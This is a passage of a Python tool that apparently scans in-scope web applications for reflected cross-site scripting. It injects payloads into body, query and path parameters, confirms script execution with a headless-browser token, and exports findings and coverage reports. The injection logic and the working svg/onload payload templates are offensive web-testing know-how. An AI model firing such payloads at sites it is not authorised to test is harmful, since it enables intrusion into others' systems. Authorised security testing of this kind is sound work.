              " ON CONFLICT(source,key) DO UPDATE SET status=excluded.status,"
              " rc=excluded.rc, ts=excluded.ts",
              ("done" if bad == 0 else "partial", bad, now()))
    print("[*] json-plan: %d job(s), %d out-of-scope rejected, %d malformed, "
          "%d dropped by cap" % (added, rejected, bad, dropped), file=sys.stderr)
    return 3 if bad else 0


def _flatten_json(obj, prefix=()):
    out = []
    if isinstance(obj, dict):
        for k, v in obj.items():
            out.extend(_flatten_json(v, prefix + (k,)))
    elif isinstance(obj, list):
        for i, v in enumerate(obj):
            out.extend(_flatten_json(v, prefix + (i,)))
    else:
        out.append((prefix, obj))
    return out


def _set_json_path(obj, path, value):
    cur = obj
    for key in path[:-1]:
        cur = cur[key]
    cur[path[-1]] = value


def _raw_request(method, url, headers, data):
    """Single raw HTTP/1.1 request, paste-ready for Burp Repeater."""
    sp = urlsplit(url)
    path = sp.path or "/"
    if sp.query:
        path += "?" + sp.query
    lines = ["%s %s HTTP/1.1" % (method.upper(), path),
             "Host: %s" % sp.netloc,
             "User-Agent: xss-scan/8",
             "Accept: */*",
             "Connection: close"]
    hdrs = dict(headers or {})
    for k, v in hdrs.items():
        if k.lower() in ("host", "content-length", "user-agent", "accept", "connection"):
            continue
        lines.append("%s: %s" % (k, v))
    body = ""
    if data:
        body = data.decode("utf-8", "replace") if isinstance(data, bytes) else str(data)
        if "content-type" not in {k.lower() for k in hdrs}:
            lines.append("Content-Type: application/x-www-form-urlencoded")
        lines.append("Content-Length: %d" % len(body.encode()))
    return "\r\n".join(lines) + "\r\n\r\n" + body


def _dump_request(req_dir, method, url, headers, data, param):
    if not req_dir:
        return ""
    try:
        os.makedirs(req_dir, exist_ok=True)
        safe = re.sub(r"[^A-Za-z0-9_.-]+", "_", (param or "param"))[:40]
        safe_url = re.sub(r"[^A-Za-z0-9]+", "_", url.split("://", 1)[-1])[:60]
        path = os.path.join(req_dir, "%s_%s_%s.txt" % (safe_url, safe, (method or "GET").lower()))
        with open(path, "w", encoding="utf-8") as fh:
            fh.write(_raw_request(method, url, headers, data))
        return path
    except Exception:
        return ""


def cmd_probe_body(spec_file, out_jsonl):
    """Probe POST/JSON body inputs for reflection, in parallel.

    Slow CGI endpoints made the sequential version miss most targets before its
    time budget expired, so each target is probed by a worker thread and results
    are written in completion order.
    """
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] probe-body: scope file missing/empty", file=sys.stderr)
        return 2
    try:
        budget = float(os.environ.get("PROBE_BUDGET", "1800") or 1800)
    except Exception:
        budget = 1800.0
    try:
        conc = int(os.environ.get("BODY_CONC", "8") or 8)
    except Exception:
        conc = 8
    try:
        pmax = int(os.environ.get("BODY_PAYLOAD_MAX", "4") or 4)
    except Exception:
        pmax = 4
    started = time.time()

    def overdue():
        return budget > 0 and (time.time() - started) > budget

    req_dir = os.environ.get("XSS_REQUEST_DIR", "")
    specs = []
    malformed = 0
    with open(spec_file, encoding="utf-8", errors="replace") as fh:
        for line in fh:
            line = line.strip()
            if not line:
                continue
            try:
                specs.append(json.loads(line))
            except Exception:
                malformed += 1

    DEFAULTS = {"version": "V3", "level": "L1", "product": "NRB",
                "site": "zzSITE", "no_qa": "0", "no_flags": "0",
                "sdate": "20200901", "edate": "20200902"}

    def js_pairs(spec):
        fields = spec.get("fields") or []
        if fields:
            pairs = [[n, v] for n, v in fields]
        else:
            pairs = [[k, v] for k, v in (spec.get("params") or {}).items()]
        # CGI endpoints often answer only with plausible values ("1" is rejected
        # with a 500 or a non-HTML error page), so fill known names everywhere
        pairs = [[n, (DEFAULTS[n] if (n in DEFAULTS and str(v) in ("", "1"))
                      else v)] for n, v in pairs]
        if spec.get("source") != "js-derived":
            return pairs[:10]
        drop = {"syear", "smonth", "sday", "eyear", "emonth", "eday", "user"}
        defaults = DEFAULTS
        pairs = [[n, defaults.get(n, v)] for n, v in pairs if n not in drop]
        have = {n for n, _ in pairs}
        for extra, val in (("sdate", "20200901"), ("edate", "20200902"),
                           ("no_qa", "0"), ("no_flags", "0")):
            if extra not in have:
                pairs.append([extra, val])
        sink = {"site", "id", "url", "q", "search", "name"}
        required = ["sdate", "edate", "version", "level", "product",
                    "no_qa", "no_flags"]

        def rank(p):
            n = p[0]
            if n in sink:
                return (0, n)
            if n in required:
                return (1, required.index(n))
            return (2, n)

        pairs.sort(key=rank)
        return pairs[:10]

    def make_rec(spec, url, param, idx, payload, hit):
        method = spec.get("method", "POST")
        rec = {
            "template-id": "reflected-body-xss",
            "info": {"name": "Reflected body parameter XSS candidate",
                     "severity": "medium"},
            "type": "body",
            "method": method,
            "url": url,
            "matched-at": "%s#body:%s" % (url, param),
            "param": param,
            "param_index": idx,
            "payload": payload,
            "evidence": hit,
            "request_outcome": "ok",
        }
        return rec

    def probe_one(spec):
        recs = []
        st = {"failed": 0, "authfail": 0, "oos": 0}
        url = spec.get("url", "")
        if not in_scope(url, allowed):
            st["oos"] += 1
            return recs, st, True
        if overdue():
            return recs, st, False
        method = spec.get("method", "POST")
        if spec.get("kind") == "json":
            base_json = spec.get("params") or {}
            leaves = _flatten_json(base_json)
            for li, (path, _old) in enumerate(leaves):
                if overdue():
                    return recs, st, False
                for payload in BODY_PAYLOADS[:pmax]:
                    if overdue():
                        return recs, st, False
                    trial = json.loads(json.dumps(base_json))
                    _set_json_path(trial, path, payload)
                    data = json.dumps(trial).encode()
                    res = http_request(url, allowed, method, data, "application/json")
                    if res["error"]:
                        st["failed"] += 1
                        break
                    if res["status"] in (401, 403):
                        st["authfail"] += 1
                        break
                    if "html" not in (res["ctype"] or "").lower():
                        continue
                    hit = next((m for m in RAW_MARKERS if m in res["body"]), None)
                    if not hit:
                        continue
                    rec = make_rec(spec, url, ".".join(map(str, path)), li, payload, hit)
                    rec["request_file"] = _dump_request(
                        req_dir, method, url, {"Content-Type": "application/json"},
                        data, ".".join(map(str, path)))
                    recs.append(rec)
                    break
            return recs, st, True

        pairs = js_pairs(spec)
        if not pairs:
            return recs, st, True
        payloads = BODY_PAYLOADS if spec.get("source") != "js-derived" else BODY_PAYLOADS[:2]
        payloads = payloads[:pmax]
        for idx in range(len(pairs)):
            if overdue():
                return recs, st, False
            for payload in payloads:
                if overdue():
                    return recs, st, False
                trial = [list(p) for p in pairs]
                trial[idx][1] = payload
                kv = [tuple(p) for p in trial]
                if method.upper() == "GET":
                    req_url = url + ("&" if "?" in url else "?") + \
                        urllib.parse.urlencode(kv)
                    data, ctype = None, None
                else:
                    req_url = url
                    data = urllib.parse.urlencode(kv).encode()
                    ctype = "application/x-www-form-urlencoded"
                res = http_request(req_url, allowed, method, data, ctype)
                if res["error"]:
                    st["failed"] += 1
                    break
                if res["status"] in (401, 403):
                    st["authfail"] += 1
                    break
                if "html" not in (res["ctype"] or "").lower():
                    continue
                hit = next((m for m in RAW_MARKERS if m in res["body"]), None)
                if not hit:
                    continue
                rec = make_rec(spec, url, pairs[idx][0], idx, payload, hit)
                rec["request_file"] = _dump_request(
                    req_dir, method, req_url,
                    {"Content-Type": ctype} if ctype else {}, data, pairs[idx][0])
                recs.append(rec)
                break
        return recs, st, True

    findings = targets = failed = oos = authfail = deferred = 0
    from concurrent.futures import ThreadPoolExecutor
    workers = max(1, min(conc, 32))
    with open(out_jsonl, "w", encoding="utf-8") as out:
        with ThreadPoolExecutor(max_workers=workers) as ex:
            futures = {ex.submit(probe_one, spec): spec for spec in specs}
            for fut in futures:
                pass
            for fut, spec in list(futures.items()):
                try:
                    recs, st, done = fut.result()
                except Exception:
                    failed += 1
                    continue
                targets += 1
                failed += st["failed"]
                oos += st["oos"]
                authfail += st["authfail"]
                if not done:
                    deferred += 1
                for rec in recs:
                    out.write(json.dumps(rec, separators=(",", ":")) + "\n")
                    findings += 1
    print("[*] body probe: %d target(s), %d candidate(s), %d request failure(s), "
          "%d auth failure(s), %d out-of-scope, %d deferred, conc=%d"
          % (targets, findings, failed, authfail, oos, deferred, workers),
          file=sys.stderr)
    if authfail:
        return 4
    if deferred:
        # unfinished targets must stay queued, so the caller aborts the batch
        return 5
    if failed and findings == 0:
        # nothing usable and requests failed: keep the jobs queued for retry
        return 6
    return 0 if oos == 0 else 3


# --------------------------------------------------------------------- verify
def _js_string(token):
    return "String.fromCharCode(%s)" % ",".join(str(ord(ch)) for ch in token)


def _query_segments(url):
    """Raw query segments, preserving positions. Single indexing model."""
    sp = urlsplit(url)
    out = []
    if not sp.query:
        return out
    for idx, seg in enumerate(sp.query.split("&")):
        if not seg:
            continue  # empty segment: not addressable, keeps others stable
        if "=" in seg:
            name, value = seg.split("=", 1)
        else:
            name, value = seg, ""
        out.append((idx, name, value))
    return out


def _inject_raw(url, seg_index, payload):
    """Replace value of one raw query segment, leaving every other byte intact."""
    sp = urlsplit(url)
    segs = sp.query.split("&")
    if seg_index >= len(segs) or not segs[seg_index]:
        return None
    name = segs[seg_index].split("=", 1)[0]
    segs[seg_index] = name + "=" + quote(payload, safe="")
    return urlunsplit((sp.scheme, sp.netloc, sp.path, "&".join(segs), sp.fragment))


def _variant_for(value):
    v = value.lower()
    if "'" in v:
        return 1
    if '"' in v:
        return 0
    if "alert" in v or "%2f%2f" in v or "//" in v:
        return 2
    return 0


def _payload(variant, token):
    js = _js_string(token)
    return {
        0: '"><svg/onload=document.body.dataset.pwn=%s>' % js,
        1: "'><svg/onload=document.body.dataset.pwn=%s>" % js,
        2: '";document.body.dataset.pwn=%s//' % js,
        3: "' onmouseover=document.body.dataset.pwn=%s x='" % js,
    }[variant]


def _path_target(candidate):
    """Return (segment_index, strategy) for a path finding.

    strategy='segment-replace' when a segment visibly carries the payload,
    'append-heuristic' otherwise (route may differ from the original sink).
    """
    sp = urlsplit(candidate)
    segs = sp.path.split("/")
    for i in range(len(segs) - 1, -1, -1):
        if not segs[i]:
            continue
        dec = urllib.parse.unquote(segs[i]).lower()
        if any(t in dec for t in ("<", ">", "svg", "onerror", "alert", "%3c")):
            return i, "segment-replace"
    return None, "append-heuristic"


def _inject_path(candidate, payload, idx=None):
    sp = urlsplit(candidate)
    segs = sp.path.split("/")
    enc = quote(payload, safe="")
    if idx is not None and 0 <= idx < len(segs):
        segs[idx] = enc
    elif segs and segs[-1] == "":
        segs[-1] = enc           # trailing slash: reuse the empty slot
    else:
        segs.append(enc)
    return urlunsplit((sp.scheme, sp.netloc, "/".join(segs), sp.query, sp.fragment))


def cmd_promote_urls(db):
    c = connect(db)
    ensure(c)
    try:
        cap = int(meta_get(c, "url_cap", "0") or 0)
    except ValueError:
        cap = 0
    promoted = 0
    while True:
        have = c.execute("SELECT COUNT(*) FROM urls"
                         " WHERE state IN ('pending','running','inflight','failed')").fetchone()[0]
        if cap > 0 and have >= cap:
            break
        limit = 500 if cap <= 0 else min(500, cap - have)
        rows = c.execute("SELECT id FROM urls WHERE state='deferred' ORDER BY id LIMIT ?",
                         (limit,)).fetchall()
        if not rows:
            break
        c.execute("BEGIN IMMEDIATE")
        c.executemany("UPDATE urls SET state='pending' WHERE id=?", [(r[0],) for r in rows])
        c.execute("COMMIT")
        promoted += len(rows)
    left = c.execute("SELECT COUNT(*) FROM urls WHERE state='deferred'").fetchone()[0]
    print("[*] promoted %d deferred url(s), %d still deferred" % (promoted, left),
          file=sys.stderr)
    return 0


def cmd_verify_plan(db, max_candidates):
    max_candidates = int(max_candidates)
    c = connect(db)
    ensure(c)
    ph = ",".join("?" for _ in MANUAL_TEMPLATES)
    base = ("SELECT id, url FROM findings WHERE template_id NOT IN (%s)"
            " AND id NOT IN (SELECT finding_id FROM attempts WHERE finding_id IS NOT NULL)"
            % ph)
    args = list(MANUAL_TEMPLATES)
    q = base + " ORDER BY id"
    if max_candidates:
        q += " LIMIT ?"
        args.append(max_candidates)
    cands = c.execute(q, args).fetchall()
    total = c.execute("SELECT COUNT(*) FROM findings WHERE template_id NOT IN (%s)"
                      % ph, list(MANUAL_TEMPLATES)).fetchone()[0]
    already = c.execute("SELECT COUNT(DISTINCT finding_id) FROM attempts"
                        " WHERE finding_id IS NOT NULL").fetchone()[0]
    created = 0
    c.execute("BEGIN IMMEDIATE")
    for fid, cand in cands:
        sp, _ = split_url(cand)
        if sp is None:
            continue
        segs = _query_segments(cand)
        if not segs:
            idx, strategy = _path_target(cand)
            for v in ({0, 2} if strategy == "segment-replace" else {0}):
                token = "XSS_CONFIRMED_" + secrets.token_hex(6)
                injected = _inject_path(cand, _payload(v, token), idx)
                if not injected:
                    continue
                c.execute(
                    "INSERT INTO attempts(finding_id,candidate,param_index,param_name,"
                    "variant,injected,token,state,strategy) VALUES(?,?,?,?,?,?,?,'pending',?)",
                    (fid, cand, -1, "path:" + strategy, v, injected, token, strategy))
                created += 1
            continue
        for seg_index, name, value in segs:
            variant = _variant_for(value)
            for v in ({variant, 0} if variant != 0 else {0}):
                token = "XSS_CONFIRMED_" + secrets.token_hex(6)
                injected = _inject_raw(cand, seg_index, _payload(v, token))
                if not injected:
                    continue
                c.execute(
                    "INSERT INTO attempts(finding_id,candidate,param_index,param_name,"
                    "variant,injected,token,state) VALUES(?,?,?,?,?,?,?,'pending')",
                    (fid, cand, seg_index, name, v, injected, token))
                created += 1
    capped = max(0, total - already - len(cands))
    meta_set(c, "verify_capped", capped)
    c.execute("COMMIT")
    print("[*] verification attempts planned: %d for %d finding(s) (capped: %d)"
          % (created, len(cands), capped), file=sys.stderr)


def cmd_verify_batch(db, n, out_file, ids_file):
    n = int(n)
    c = connect(db)
    ensure(c)
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] verify-batch: scope policy missing/empty; refusing to emit any URL",
              file=sys.stderr)
        open(out_file, "w").close()
        open(ids_file, "w").close()
        return 2
    rows, ids = _claim_rows(
        c, "SELECT id, injected FROM attempts WHERE state='pending' ORDER BY id LIMIT ?",
        (), n)
    keep = []
    with open(out_file, "w", encoding="utf-8") as fh:
        for rid, inj in rows:
            if not in_scope(inj, allowed):
                # navigation guard: never hand an out-of-scope URL to the browser
                c.execute("UPDATE attempts SET state='error', rc=-1, evidence='out_of_scope'"
                          " WHERE id=?", (rid,))
                continue
            fh.write(inj + "\n")
            keep.append(rid)
    with open(ids_file, "w", encoding="utf-8") as ih:
        for rid in keep:
            ih.write("%d\n" % rid)
    if keep:
        c.executemany("UPDATE attempts SET state='running' WHERE id=?",
                      [(i,) for i in keep])
    c.execute("COMMIT")
    print(len(keep))


def _canon(u):
    return urllib.parse.unquote(u or "").strip()


PROOF_EXTRACTOR = "exec-proof"


def _execution_evidence(record, token, injected):
    """Proof must come from the exec-proof extractor of this exact request: the
    token read from document.body.dataset.pwn after script execution. Raw response
    text and other extractors are rejected."""
    if record.get("template-id") != "xss-headless-verify":
        return ""
    if (record.get("type") or "").lower() != "headless":
        return ""
    if (record.get("extractor-name") or "") != PROOF_EXTRACTOR:
        return ""
    r_url = record.get("matched-at") or record.get("url") or ""
    if _canon(r_url) != _canon(injected):
        return ""  # evidence from another request is not our proof
    for val in (record.get("extracted-results") or []):
        if str(val).strip() == token:
            return token
    return ""


def cmd_verify_commit(db, jsonl_file, ids_file, rc="0"):
    rc = int(rc)
    c = connect(db)
    ensure(c)
    ids = _ids(ids_file)
    id_set = set(ids)
    tokens = {}
    for rid in ids:
        row = c.execute("SELECT token, injected FROM attempts WHERE id=?", (rid,)).fetchone()
        if row:
            tokens[row[0]] = (rid, row[1])
    problems = 0
    evidence = {}
    if not jsonl_file or not os.path.exists(jsonl_file):
        problems = 1
    else:
        with open(jsonl_file, encoding="utf-8", errors="replace") as fh:
            for line in fh:
                line = line.strip()
                if not line:
                    continue
                try:
                    rec = json.loads(line)
                except Exception:
                    problems = 1
                    continue
                for tok in TOKEN_RE.findall(json.dumps(rec)):
                    pair = tokens.get(tok)
                    if pair is None:
                        continue
                    rid, injected = pair
                    if rid not in id_set:
                        continue
                    ev = _execution_evidence(rec, tok, injected)
                    if ev:
                        evidence.setdefault(rid, ev)
    conf = neg = err = 0
    c.execute("BEGIN IMMEDIATE")
    for rid in ids:
        row = c.execute("SELECT state FROM attempts WHERE id=?", (rid,)).fetchone()
        if not row or row[0] != "running":
            continue
        if rid in evidence:
            c.execute("UPDATE attempts SET state='confirmed', rc=?, evidence=?, proof=?"
                      " WHERE id=?", (rc, PROOF_EXTRACTOR, evidence[rid], rid))
            conf += 1
        elif rc == 0 and problems == 0:
            c.execute("UPDATE attempts SET state='not_confirmed', rc=? WHERE id=?", (rc, rid))
            neg += 1
        else:
            c.execute("UPDATE attempts SET state='error', rc=? WHERE id=?", (rc, rid))
            err += 1
    c.execute("COMMIT")
    if problems:
        print("[!] verify-commit: output missing or malformed; attempts marked error",
              file=sys.stderr)
        return 1
    if rc != 0:
        print("[!] verify-commit: scanner rc=%d; positives kept, remainder marked error" % rc,
              file=sys.stderr)
        return 2
    print("[*] verify commit: confirmed=%d not_confirmed=%d error=%d" % (conf, neg, err),
          file=sys.stderr)
    return 0


def cmd_verify_report(db, out_file):
    c = connect(db)
    ensure(c)
    per = {}
    for (fid, cand, rid, pi, pn, var, inj, state, rc, ev, proof, strat) in c.execute(
            "SELECT finding_id,candidate,id,param_index,param_name,variant,injected,"
            "state,rc,evidence,proof,strategy FROM attempts"
            " ORDER BY finding_id, candidate, id"):
        key = ("f%d" % fid) if fid is not None else ("u%s" % cand)
        d = per.setdefault(key, {"finding_id": fid, "url": cand, "attempts": [],
                                 "status": "not_confirmed"})
        d["attempts"].append({"id": rid, "param_index": pi, "param": pn, "variant": var,
                              "injected": inj, "status": state, "rc": rc,
                              "evidence": ev, "proof": proof, "strategy": strat})
        if strat == "append-heuristic":
            d["heuristic"] = True
    for d in per.values():
        states = [a["status"] for a in d["attempts"]]
        if "confirmed" in states:
            d["status"] = "confirmed"
        elif "error" in states:
            d["status"] = "verification_error"
        elif states and all(s == "not_confirmed" for s in states):
            # a heuristic path/append test cannot prove the original sink clean
            d["status"] = "inconclusive_heuristic" if d.get("heuristic") else "not_confirmed"
        else:
            d["status"] = "inconclusive"
    with open(out_file, "w", encoding="utf-8") as fh:
        for d in per.values():
            fh.write(json.dumps(d, separators=(",", ":")) + "\n")
    counts = {}
    for d in per.values():
        counts[d["status"]] = counts.get(d["status"], 0) + 1
    print("[+] verification: " + ", ".join("%s=%d" % kv for kv in sorted(counts.items())))


def cmd_export_confirmed(db, out_file):
    """One record per confirmed finding, with every confirming attempt."""
    c = connect(db)
    ensure(c)
    per = {}
    for (fid, cand, pn, inj, ev, proof) in c.execute(
            "SELECT finding_id,candidate,param_name,injected,evidence,proof FROM attempts"
            " WHERE state='confirmed' ORDER BY id"):
        key = fid if fid is not None else cand
        d = per.setdefault(key, {"finding_id": fid, "url": cand, "params": [],
                                 "evidence": ev, "proofs": [], "attempts": []})
        if pn and pn not in d["params"]:
            d["params"].append(pn)
        if inj not in d["attempts"]:
            d["attempts"].append(inj)
        if proof and proof not in d["proofs"]:
            d["proofs"].append(proof)
    with open(out_file, "w", encoding="utf-8") as fh:
        for d in per.values():
            fh.write(json.dumps(d, separators=(",", ":")) + "\n")
    print("[*] confirmed findings exported: %d (from %d confirmed attempts)"
          % (len(per), sum(len(d["attempts"]) for d in per.values())), file=sys.stderr)


def cmd_verify_reset(db):
    c = connect(db)
    ensure(c)
    cur = c.execute("DELETE FROM attempts")
    meta_set(c, "verify_capped", 0)
    meta_set(c, "verify_batch_errors", 0)
    print("[*] cleared %d attempt(s) and verification error state" % cur.rowcount,
          file=sys.stderr)


# -------------------------------------------------------------------- exports
def cmd_meta_set(db, key, value):
    c = connect(db)
    ensure(c)
    meta_set(c, key, value)
    print("[*] meta %s=%s" % (key, value), file=sys.stderr)


def cmd_export(db, out_file):
    c = connect(db)
    ensure(c)
    tmp = out_file + ".tmp"
    n = 0
    with open(tmp, "w", encoding="utf-8") as fh:
        for (blob,) in c.execute(
                "SELECT json FROM findings"
                " WHERE COALESCE(context,'') NOT IN"
                " ('json_data','gone','non_html','escaped','blocked')"
                " ORDER BY id"):
            fh.write(blob + "\n")
            n += 1
    os.replace(tmp, out_file)
    print("[*] exported %d finding(s)" % n, file=sys.stderr)


def cmd_stats(db):
    c = connect(db)
    ensure(c)
    urls = dict(c.execute("SELECT state, COUNT(*) FROM urls GROUP BY state"))
    jobs = dict(c.execute("SELECT state, COUNT(*) FROM jobs GROUP BY state"))
    att = dict(c.execute("SELECT state, COUNT(*) FROM attempts GROUP BY state"))
    print(json.dumps({"urls": urls, "jobs": jobs, "attempts": att,
                      "findings": c.execute("SELECT COUNT(*) FROM findings").fetchone()[0]},
                     sort_keys=True))


def cmd_ctxfilter(db, keep="0"):
    """Drop reflection-only candidates whose payload lives inside JSON data blobs.

    Next.js/SPA pages echo query strings inside <script type="application/json">
    (__NEXT_DATA__). That is data, never executed, so it must not be reported.
    """
    allowed = load_policy(SCOPE_FILE)
    if not allowed:
        print("[-] ctxfilter: scope policy missing", file=sys.stderr)
        return 2
    c = connect(db)
    ensure(c)
    rows = c.execute(
        "SELECT id, url, template_id FROM findings"
        " WHERE COALESCE(context,'') IN"
        " ('','unknown','unreachable','blocked')").fetchall()
    html = json_only = unknown = dropped = 0
    for fid, url, tid in rows:
        if tid in MANUAL_TEMPLATES:
            continue
        try:
            sp = urlsplit(url)
            values = [v for _, v in parse_qsl(sp.query, keep_blank_values=True)]
        except Exception:
            values = []
        markers = [v for v in values if len(v) > 3 and any(
            t in v.lower() for t in ("<", "alert(", "onerror", "onmouseover",
                                     "svg", "script", "javascript:"))]
        if not markers:
            unknown += 1
            c.execute("UPDATE findings SET context='unknown' WHERE id=?", (fid,))
            continue
        res = http_request(url, allowed, "GET")
        if res["error"] or not res["body"]:
            unknown += 1
            c.execute("UPDATE findings SET context='unreachable' WHERE id=?", (fid,))
            continue
        if res["status"] in (429, 503):
            # rate limited / unavailable: undecided, retry on a later pass
            unknown += 1
            c.execute("UPDATE findings SET context='blocked' WHERE id=?", (fid,))
            continue
        if "html" not in (res["ctype"] or "").lower():
            dropped += 1
            c.execute("UPDATE findings SET context='non_html' WHERE id=?", (fid,))
            continue
        body = res["body"]
        stripped = re.sub(r"<script[^>]*type=[\"']application/(?:ld\+)?json[\"'][^>]*>.*?</script>",
                          "", body, flags=re.I | re.S)
        stripped = re.sub(r"<script[^>]*id=[\"']__NEXT_DATA__[\"'][^>]*>.*?</script>",
                          "", stripped, flags=re.I | re.S)
        # non-executable containers: payload there cannot run
        for pat in (r"<!--.*?-->", r"<textarea\b.*?</textarea>", r"<title\b.*?</title>",
                    r"<xmp\b.*?</xmp>", r"<noscript\b.*?</noscript>",
                    r"<style\b.*?</style>"):
            stripped = re.sub(pat, "", stripped, flags=re.I | re.S)
        hit_html = any(m in stripped for m in markers)
        if not hit_html and _only_escaped(markers, stripped):
            dropped += 1
            c.execute("UPDATE findings SET context='escaped' WHERE id=?", (fid,))
            continue
        hit_json = (not hit_html) and any(m in body for m in markers)
        if hit_html:
            html += 1
            c.execute("UPDATE findings SET context='html' WHERE id=?", (fid,))
        elif hit_json:
            json_only += 1
            c.execute("UPDATE findings SET context='json_data' WHERE id=?", (fid,))
            if str(keep) != "1":
                c.execute("DELETE FROM attempts WHERE finding_id=?", (fid,))
                # keep the row (evidence) but mark it non-reportable
                c.execute("UPDATE findings SET context='json_data' WHERE id=?", (fid,))
                dropped += 1
        else:
            unknown += 1
            c.execute("UPDATE findings SET context='gone' WHERE id=?", (fid,))
    print("[*] ctxfilter: html=%d json_data=%d dropped=%d unknown=%d"
          % (html, json_only, dropped, unknown), file=sys.stderr)
    return 0


def cmd_coverage(db, out_file):
    c = connect(db)
    ensure(c)
    urls = dict(c.execute("SELECT state, COUNT(*) FROM urls GROUP BY state"))
    jobs = {(k, s): n for (k, s, n) in
            c.execute("SELECT kind, state, COUNT(*) FROM jobs GROUP BY kind, state")}
    att = dict(c.execute("SELECT state, COUNT(*) FROM attempts GROUP BY state"))
    disc = dict(c.execute("SELECT status, COUNT(*) FROM discovery GROUP BY status"))
    manual = c.execute("SELECT COUNT(*) FROM findings WHERE template_id IN (%s)"
                       % ",".join("'%s'" % t for t in MANUAL_TEMPLATES)).fetchone()[0]
    confirmed = len({fid if fid is not None else ("u", cand) for fid, cand in
                     c.execute("SELECT finding_id, candidate FROM attempts"
                               " WHERE state='confirmed'")})
    verify_requested = int(meta_get(c, "verify_requested", "0") or 0)
    batch_errors = int(meta_get(c, "verify_batch_errors", "0") or 0)
    forced = int(meta_get(c, "config_forced", "0") or 0)
    jobs_capped = c.execute("SELECT COUNT(*) FROM jobs WHERE state='deferred'").fetchone()[0]
    config_ids = [r[0] for r in c.execute("SELECT DISTINCT config_id FROM observations"
                                          " WHERE config_id != ''")]
    if not config_ids:
        config_ids = [r[0] for r in c.execute("SELECT DISTINCT config_id FROM findings"
                                              " WHERE config_id != ''")]
    capped = int(meta_get(c, "verify_capped", "0") or 0)
    skipped_pages = int(meta_get(c, "forms_skipped", "0") or 0)
    url_open = (urls.get("pending", 0) + urls.get("inflight", 0) + urls.get("failed", 0)
                + urls.get("deferred", 0))
    path_open = sum(v for (k, s), v in jobs.items()
                    if k == "path" and s in ("pending", "running", "failed"))
    body_open = sum(v for (k, s), v in jobs.items()
                    if k in ("form", "json") and s in ("pending", "running", "failed"))
    att_open = att.get("pending", 0) + att.get("running", 0)
    att_err = att.get("error", 0)
    ph_manual = ",".join("'%s'" % t for t in MANUAL_TEMPLATES)
    eligible = c.execute("SELECT COUNT(*) FROM findings WHERE template_id NOT IN (%s)"
                         % ph_manual).fetchone()[0]
    planned = c.execute("SELECT COUNT(DISTINCT finding_id) FROM attempts"
                        " WHERE finding_id IS NOT NULL").fetchone()[0]
    unplanned = max(0, eligible - planned)
    # 'failed' is terminal: the source was retried and parked. Only work that
    # can still make progress (pending/partial/running) blocks completion.
    # per-page form failures (404s) are expected; any other failed source means
    # endpoints may be missing, so completion must not be claimed
    src_fail = c.execute(
        "SELECT COUNT(*) FROM discovery WHERE status='failed'"
        " AND source IN ('httpx','katana','gau','js','sitemap')").fetchone()[0]
    forms_failed = c.execute("SELECT COUNT(*) FROM discovery WHERE source='forms'"
                             " AND status='failed'").fetchone()[0]
    discovery_complete = (all(s in ("done", "failed") for s in disc) and bool(disc)
                          and src_fail == 0)
    verification_complete = (verify_requested == 1 and att_open == 0 and att_err == 0
                             and capped == 0 and unplanned == 0)
    work_complete = (discovery_complete and url_open == 0 and path_open == 0
                     and body_open == 0 and jobs_capped == 0)
    urls_capped = urls.get("deferred", 0)
    heuristic_attempts = c.execute("SELECT COUNT(*) FROM attempts"
                                   " WHERE strategy='append-heuristic'").fetchone()[0]
    src_fail_cov = c.execute(
        "SELECT COUNT(*) FROM discovery WHERE status='failed'"
        " AND source IN ('httpx','katana','gau','js','sitemap')").fetchone()[0]
    forms_failed_cov = c.execute(
        "SELECT COUNT(*) FROM discovery WHERE source='forms' AND status='failed'").fetchone()[0]
    rep = {
        "discovery_failed_sources": src_fail_cov,
        "forms_pages_failed": forms_failed_cov,
        "generated": now(),
        "urls": {k: urls.get(k, 0) for k in ("pending", "inflight", "done", "failed",
                                            "deferred")},
        "urls_capped": urls_capped,
        "heuristic_path_attempts": heuristic_attempts,
        "path_jobs": {k: sum(v for (kk, s), v in jobs.items()
                             if kk == "path" and s == k)
                      for k in ("pending", "running", "done", "failed")},
        "body_jobs": {k: sum(v for (kk, s), v in jobs.items()
                             if kk in ("form", "json") and s == k)
                      for k in ("pending", "running", "done", "failed")},
        "attempts": {k: att.get(k, 0) for k in ("pending", "running", "confirmed",
                                                "not_confirmed", "error")},
        "discovery": disc,
        "forms_skipped_pages": skipped_pages,
        "findings": c.execute("SELECT COUNT(*) FROM findings").fetchone()[0],
        "confirmed_candidates": confirmed,
        "manual_confirmation_required": manual,
        "verification_requested": bool(verify_requested),
        "verification_skipped": verify_requested == 0,
        "verification_batch_errors": att_err,
        "config_forced": bool(forced),
        "config_ids": config_ids,
        "mixed_config": len(config_ids) > 1,
        "jobs_capped": jobs_capped,
        "verification_capped": capped,
        "verification_unplanned": unplanned,
        "discovery_complete": discovery_complete,
        "query_complete": url_open == 0,
        "path_complete": path_open == 0,
        "body_complete": body_open == 0,
        "verification_complete": verification_complete,
        "work_complete": work_complete,
        "complete": work_complete and verification_complete,
    }
    with open(out_file, "w", encoding="utf-8") as fh:
        json.dump(rep, fh, indent=2, sort_keys=True)
        fh.write("\n")
    print(json.dumps(rep, sort_keys=True), file=sys.stderr)


# ------------------------------------------------------------------------ main
def main(argv):
    if len(argv) < 2:
        print(__doc__, file=sys.stderr)
        return 2
    try:
        return _dispatch(argv)
    except KeyboardInterrupt:
        return 130


def _dispatch(argv):
    cmd, args = argv[1], argv[2:]
    plain = {
        "init": cmd_init, "ingest": cmd_ingest, "batch": cmd_batch,
        "path-plan": cmd_path_plan, "path-batch": cmd_path_batch,
        "list-targets": cmd_list_targets, "list-js": cmd_list_js,
        "url-count": cmd_url_count, "sitemap-parse": cmd_sitemap_parse,
        "harvest": cmd_harvest,
        "show-findings": cmd_show_findings, "show-confirmed": cmd_show_confirmed,
        "confirmed-new": cmd_confirmed_new, "api-reflect": cmd_api_reflect,
        "live-watch": cmd_live_watch, "host-status": cmd_host_status,
        "merge-run": cmd_merge_run,
        "js-extract": cmd_js_extract,
        "path-abort": cmd_path_abort, "body-batch": cmd_body_batch,
        "body-abort": cmd_body_abort, "export": cmd_export, "stats": cmd_stats,
        "coverage": cmd_coverage, "ctxfilter": cmd_ctxfilter, "verify-plan": cmd_verify_plan,
        "verify-report": cmd_verify_report,
        "verify-reset": cmd_verify_reset, "discovery-set": cmd_discovery_set,
        "discovery-status": cmd_discovery_status, "discovery-done": cmd_discovery_done,
